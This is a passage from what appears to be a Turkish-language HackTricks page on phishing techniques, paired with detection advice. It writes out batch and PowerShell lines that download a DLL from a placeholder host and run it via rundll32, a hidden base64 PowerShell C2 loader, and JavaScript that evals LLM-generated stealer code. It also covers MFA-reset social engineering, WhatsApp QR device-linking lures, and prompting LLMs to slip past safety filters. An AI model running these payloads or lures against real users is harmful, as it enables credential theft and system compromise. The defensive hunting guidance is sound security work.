  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest`, payload'ı `%TEMP%` dizinine bırakır; kısa bir sleep, ağ jitter'ını gizler; ardından `rundll32`, dışa aktarılan entrypoint'i (`notepad`) çağırır.
* DLL, host kimliğini gönderir ve birkaç dakikada bir C2'yi yoklar. Uzaktan gelen tasking, gizli olarak ve policy bypass ile çalıştırılan **base64-encoded PowerShell** biçimindedir:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Bu, C2 esnekliğini korur (sunucu, DLL'yi güncellemeden görevleri değiştirebilir) ve konsol pencerelerini gizler. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` ifadelerini birlikte kullanan `rundll32.exe` alt süreçleri olan PowerShell süreçlerini avlayın.
* Savunmacılar, `...page.php?tynor=<COMPUTER>sss<USER>` biçimindeki HTTP(S) callback'lerini ve DLL yüklemesinden sonra 5 dakikalık polling aralıklarını arayabilir.

---

## AI ile Geliştirilmiş Phishing Operasyonları
Saldırganlar artık tamamen kişiselleştirilmiş tuzaklar ve gerçek zamanlı etkileşim için **LLM ve ses klonlama API'lerini** birleştiriyor.

| Katman | Tehdit aktörünün kullanım örneği |
|-------|-----------------------------|
|Otomasyon|Rastgeleleştirilmiş ifadeler ve takip bağlantılarıyla 100 binden fazla e-posta / SMS üretip gönderme.|
|Üretken AI|Kamuya açık M&A'dan ve sosyal medyadaki iç şakalardan bahseden *tek seferlik* e-postalar üretme; callback scam'de CEO'nun deep-fake sesini kullanma.|
|Agentic AI|Alan adlarını otonom olarak kaydetme, açık kaynaklı istihbaratı tarama, kurban tıkladığında ancak kimlik bilgilerini göndermediğinde sonraki aşama e-postalarını hazırlama.|

**Savunma:**  
• Güvenilmeyen otomasyon kaynaklarından gönderilen mesajları vurgulayan **dinamik banner'lar** ekleyin (ARC/DKIM anormallikleri üzerinden).  
• Yüksek riskli telefon talepleri için **ses biyometrisi sorgulama ifadeleri** kullanın.  
• Farkındalık programlarında AI tarafından oluşturulmuş tuzakları sürekli simüle edin – statik şablonların devri geçti.

Ayrıca bkz. – kimlik bilgilerini çalmaya yönelik phishing için agentic browsing kötüye kullanımı:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Ayrıca bkz. – yerel CLI araçlarının ve MCP'nin AI agent tarafından kötüye kullanımı (gizli bilgilerin envanteri ve tespiti için):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Phishing JavaScript'inin LLM yardımıyla çalışma zamanında derlenmesi (tarayıcı içi kod üretimi)

Saldırganlar zararsız görünen HTML gönderebilir ve **güvenilir bir LLM API'sinden** JavaScript isteyerek, ardından bunu tarayıcıda çalıştırarak (örn. `eval` veya dinamik `<script>`) **stealer'ı çalışma zamanında üretebilir**.<sup>[[8]](#references)</sup>

1. **Obfuscation olarak prompt:** veri sızdırma URL'lerini/Base64 dizelerini prompt'a kodlayın; güvenlik filtrelerini aşmak ve halüsinasyonları azaltmak için ifadeleri yineleyin.
2. **İstemci tarafında API çağrısı:** sayfa yüklenirken JS, herkese açık bir LLM'i (Gemini/DeepSeek/etc.) veya CDN proxy'sini çağırır; statik HTML'de yalnızca prompt/API çağrısı bulunur.
3. **Birleştir ve çalıştır:** yanıtı birleştirip çalıştırın (her ziyarette polimorfik):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** oluşturulan kod oltama mesajını kişiselleştirir (örn. LogoKit token ayrıştırma) ve kimlik bilgilerini prompt içinde gizlenmiş endpoint'e gönderir.

**Kaçınma özellikleri**
- Trafik, iyi bilinen LLM domain'lerine veya itibarlı CDN proxy'lerine gider; bazen bir backend'e WebSocket üzerinden bağlanır.
- Statik payload yoktur; kötü amaçlı JS yalnızca render işleminden sonra bulunur.
- Deterministik olmayan üretimler, her oturumda **benzersiz** stealer'lar oluşturur.

**Tespit fikirleri**
- JS etkinleştirilmiş sandbox'lar çalıştırın; LLM yanıtlarından kaynaklanan çalışma zamanı `eval`/dinamik script oluşturma işlemlerini işaretleyin.
- LLM API'lerine yapılan front-end POST isteklerinin hemen ardından, döndürülen metinde `eval`/`Function` kullanımını araştırın.
- İstemci trafiğinde izin verilmeyen LLM domain'leri görülüp ardından kimlik bilgileri POST edilirse uyarı verin.

---

## MFA Fatigue / Push Bombing Varyantı – Zorunlu Sıfırlama
Klasik push-bombing'in yanı sıra operatörler, yardım masası görüşmesi sırasında **yeni bir MFA kaydını zorunlu kılarak** kullanıcının mevcut token'ını geçersiz hale getirir. Sonraki oturum açma istemleri kurbana meşru görünür.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

AzureAD/AWS/Okta olaylarında **`deleteMFA` + `addMFA`** işlemlerinin **aynı IP’den birkaç dakika içinde** gerçekleşip gerçekleşmediğini izleyin.



## Clipboard Hijacking / Pastejacking

Saldırganlar, ele geçirilmiş veya typosquatting amacıyla hazırlanmış bir web sayfası üzerinden kurbanın panosuna kötü amaçlı komutları sessizce kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırmaya kandırarak herhangi bir indirme veya ek olmadan rastgele kod çalıştırabilir.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing ve Kötü Amaçlı Uygulama Dağıtımı (Android ve iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR sosyal mühendisliğiyle WhatsApp cihaz bağlama saldırısı
* Bir tuzak sayfa (ör. sahte bir bakanlık/CERT “kanalı”), WhatsApp Web/Desktop QR kodu gösterir ve kurbana bunu taramasını söyler; böylece saldırgan sessizce **bağlı cihaz** olarak eklenir.<sup>[[12]](#references)</sup>
* Saldırgan, oturum kaldırılana kadar sohbetleri/kişileri hemen görüntüleyebilir. Kurbanlar daha sonra “yeni cihaz bağlandı” bildirimini görebilir; savunma ekipleri, güvenilmeyen QR sayfalarının ziyaret edilmesinden kısa süre sonra gerçekleşen beklenmedik cihaz bağlama olaylarını araştırabilir.

### Crawler/sandbox’lardan kaçınmak için mobil cihaz koşullu phishing
Operatörler, masaüstü crawler’larının son sayfalara ulaşamaması için phishing akışlarını basit bir cihaz kontrolü arkasında giderek daha fazla gizliyor. Yaygın bir yöntem, dokunmatik özelliği olan bir DOM olup olmadığını kontrol eden ve sonucu bir sunucu endpoint’ine gönderen küçük bir script kullanmaktır; mobil olmayan istemciler HTTP 500 (veya boş bir sayfa) alırken, mobil kullanıcılara akışın tamamı sunulur.<sup>[[7]](#references)</sup>

Asgari istemci snippet’i (tipik mantık):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` mantığı (basitleştirilmiş):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Sunucu davranışında sıklıkla gözlemlenenler:
- İlk yükleme sırasında bir oturum çerezi ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- Sonraki GET isteklerine `is_mobile=false` olduğunda 500 (veya yer tutucu) yanıtı verir; phishing içeriğini yalnızca `true` olduğunda sunar.

Tehdit avı ve tespit sezgisel kuralları:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetrisi: `GET /static/detect_device.js` → `POST /detect` → mobil olmayanlar için HTTP 500 sırası; meşru mobil kurbanların yolları ise devamında HTML/JS ile 200 yanıtı verir.
- İçeriği yalnızca `ontouchstart` veya benzeri cihaz kontrollerine göre sunan sayfaları engelleyin veya incelemeye alın.

Savunma önerileri:
- Kısıtlanmış içeriği ortaya çıkarmak için crawler'ları mobil benzeri parmak izleri ve etkin JS ile çalıştırın.
- Yeni kaydedilmiş alan adlarında `POST /detect` sonrasında gelen şüpheli 500 yanıtları için uyarı oluşturun.

## References

- [1] [Phishing'de Kullanılan Alan Adı Varyasyonlarını Oluşturma (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing'i Bulma: Araçlar ve Teknikler (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC Kullanarak Kimlik Bilgilerini Çalma ve 2FA'yı Atlama (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC ile Oturumları Çalma ve 2FA'yı Atlama (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy'de Postfix ile DKIM Kurulumu ve Yapılandırması (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Küresel Olay Müdahale Raporu – Sosyal Mühendislik Sürümü](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Sessiz Smishing – mobil cihazlarla kısıtlanmış phishing altyapısı ve sezgisel kurallar (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Çalışma Zamanında Birleştirme Saldırılarında Yeni Sınır: Gerçek Zamanlı Phishing JavaScript'i Üretmek için LLM'lerden Yararlanma](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Kimliğe Bürünme, Tıklama Kaçırma ve TDS: Bir Kötü Amaçlı Yazılım Dağıtım Ekosisteminin İç Yüzü](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com'da Bitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bit çevirme yoluyla Microsoft'un windows.com adresine giden trafiği ele geçirme (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Aşk mı? Aslında: Pakistan'da hedefli casus yazılım kampanyasında yem olarak kullanılan sahte flört uygulaması](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC'leri ve örnekleri](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
